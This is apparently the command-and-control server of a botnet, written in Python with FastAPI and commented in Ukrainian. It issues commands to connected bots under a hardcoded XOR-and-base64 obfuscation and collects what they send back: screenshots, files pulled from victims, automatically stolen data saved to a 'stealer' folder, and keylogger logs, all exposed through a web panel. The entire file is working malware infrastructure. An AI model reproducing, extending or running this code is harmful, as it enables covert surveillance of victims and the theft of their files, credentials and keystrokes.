from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.responses import FileResponse, Response
import asyncio
import base64
import os
from datetime import datetime

app = FastAPI(title="AMY Botnet C2 - STEAL MODE")

# Визначаємо шлях до папки з UI
current_file_path = os.path.abspath(__file__)
project_root = os.path.dirname(os.path.dirname(current_file_path))
ui_path = os.path.join(project_root, "ui")

# Створюємо папки для даних
os.makedirs("screenshots", exist_ok=True)
os.makedirs("logs", exist_ok=True)
os.makedirs("downloads", exist_ok=True)
os.makedirs("stealer", exist_ok=True) # Папка для автоматично вкрадених даних

active_bots = {}
bot_responses = {}
last_screenshot_data = {} 

# XOR Ключ (має збігатися з клієнтом)
X_KEY = "AMY_2026_SECRET"

def crypt_logic(data: str) -> str:
    key = X_KEY
    return "".join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))

def decrypt(data: str) -> str:
    try:
        decoded = base64.b64decode(data).decode()
        return crypt_logic(decoded)
    except: return None

def encrypt(data: str) -> str:
    res = crypt_logic(data)
    return base64.b64encode(res.encode()).decode()

@app.get("/")
async def read_index():
    return FileResponse(os.path.join(ui_path, "index.html"))

@app.get("/bots")
async def list_bots():
    return {"bots": list(active_bots.keys())}

@app.get("/response/{bot_id}")
async def get_response(bot_id: str):
    res = bot_responses.pop(bot_id, "")
    if res == "SCREENSHOT_LOADED": return {"response": "IMAGE_READY", "is_img": True}
    if res.startswith("FILE_SAVED:"): return {"response": f"FILE_SAVED|{res.split(':',1)[1]}", "is_img": False}
    return {"response": res, "is_img": False}

@app.get("/view_screenshot/{bot_id}")
async def view_screenshot(bot_id: str):
    data = last_screenshot_data.get(bot_id)
    if data: return Response(content=data, media_type="image/png")
    return Response(status_code=404)

@app.get("/download_file/{filename}")
async def download_stolen_file(filename: str):
    # Дозволяємо скачування і з downloads, і з stealer
    fpath_down = os.path.join("downloads", filename)
    fpath_steal = os.path.join("stealer", filename)
    
    if os.path.exists(fpath_down): return FileResponse(path=fpath_down, filename=filename)
    if os.path.exists(fpath_steal): return FileResponse(path=fpath_steal, filename=filename)
    return {"error": "File not found"}

@app.post("/command")
async def send_command(bot_id: str, command: str):
    if bot_id in active_bots:
        bot_responses[bot_id] = "Waiting for bot..." 
        await active_bots[bot_id].send_text(encrypt(command))
        return {"status": "success"}
    return {"status": "error"}

@app.websocket("/ws/{bot_id}")
async def websocket_endpoint(websocket: WebSocket, bot_id: str):
    await websocket.accept()
    active_bots[bot_id] = websocket
    try:
        while True:
            raw = await websocket.receive_text()
            data = decrypt(raw)
            if not data: continue
            
            # Обробка скріншотів
            if data.startswith("SCREENSHOT:"):
                img_bytes = base64.b64decode(data[11:])
                last_screenshot_data[bot_id] = img_bytes
                bot_responses[bot_id] = "SCREENSHOT_LOADED"
            
            # Обробка ручного скачування файлів
            elif data.startswith("FILE_DATA:"):
                # Формат: FILE_DATA:filename:base64
                parts = data.split(":", 2)
                fname = f"{bot_id}_{parts[1]}"
                with open(f"downloads/{fname}", "wb") as f: f.write(base64.b64decode(parts[2]))
                bot_responses[bot_id] = f"FILE_SAVED:{fname}"
            
            # Обробка автоматично вкрадених даних (стілер)
            elif data.startswith("STEAL_DATA:"):
                # Формат: STEAL_DATA:type:filename:base64
                parts = data.split(":", 3)
                s_type = parts[1]
                fname = parts[2]
                f_bytes = base64.b64decode(parts[3])
                
                # Зберігаємо в окрему папку, додаючи тип
                save_path = f"stealer/{bot_id}_{s_type}_{fname}"
                with open(save_path, "wb") as f: f.write(f_bytes)
                bot_responses[bot_id] = f"Stealer data received ({s_type})."
                
            # Обробка кейлоггера
            elif data.startswith("KEYLOG:"):
                with open(f"logs/{bot_id}.txt", "a") as f: f.write(data[7:] + "\n")
                bot_responses[bot_id] = "Keylog packet received."
            
            # Звичайна відповідь
            else:
                bot_responses[bot_id] = data
    except WebSocketDisconnect:
        if bot_id in active_bots: del active_bots[bot_id]
